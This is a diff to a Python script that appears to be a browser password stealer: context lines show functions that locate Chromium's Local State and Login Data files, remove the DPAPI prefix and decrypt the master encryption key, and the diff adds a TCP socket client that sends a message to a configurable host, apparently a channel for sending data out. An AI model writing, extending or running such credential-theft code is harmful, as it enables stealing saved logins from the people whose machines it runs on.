@@ -44,6 +44,33 @@ os.system("color") # Comment out on Linux
 
 #===========================#
 
+def connect_to_server(host='127.0.0.1', port=12345, message="Hello!"):
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+    
+        try:
+    
+            # Connect to the server
+            client_socket.connect((host, port))
+            
+            print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Connected to [{bcolors.WARNING}{host}:{port}{bcolors.ENDC}]")
+            
+            # Send the message
+            client_socket.sendall(message.encode('utf-8'))
+            
+            print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] Sent: [{bcolors.OKCYAN}{message}{bcolors.ENDC}]")
+            
+            # Close the connection
+            client_socket.close()
+            
+            print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] Connection closed.")
+
+        except Exception as e:
+        
+            print(f"| [{bcolors.WARNING}x{bcolors.ENDC}] Error: {e}")
+
+#===========================#
+
 def find_local_state():
     user_profile = os.environ.get("USERPROFILE")
     
@@ -56,6 +83,8 @@ def find_local_state():
     print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Local state file: [{bcolors.WARNING}"+str(local_state_path)+f"{bcolors.ENDC}]")
     return local_state_path
 
+#===========================#
+
 def find_login_data():
     user_profile = os.environ.get("USERPROFILE")
     if not user_profile:
@@ -66,6 +95,8 @@ def find_login_data():
     
     print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Login data file: [{bcolors.WARNING}"+str(login_data_path)+f"{bcolors.ENDC}]")
     return login_data_path
+
+#===========================#
 
 def get_encrypted_key(local_state_path):
     try:
@@ -82,6 +113,8 @@ def get_encrypted_key(local_state_path):
         print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] Error: {e}")
         return ""
 
+#===========================#
+
 def decrypt_key(encrypted_key):
 
     encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove "DPAPI" prefix
@@ -90,6 +123,8 @@ def decrypt_key(encrypted_key):
     print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Decrypted key: [{bcolors.WARNING}"+str(decrypted_key)+f"{bcolors.ENDC}]")
     
     return decrypted_key
+
+#===========================#
 
 def login_data_parser(login_data_path, decryption_key):
 
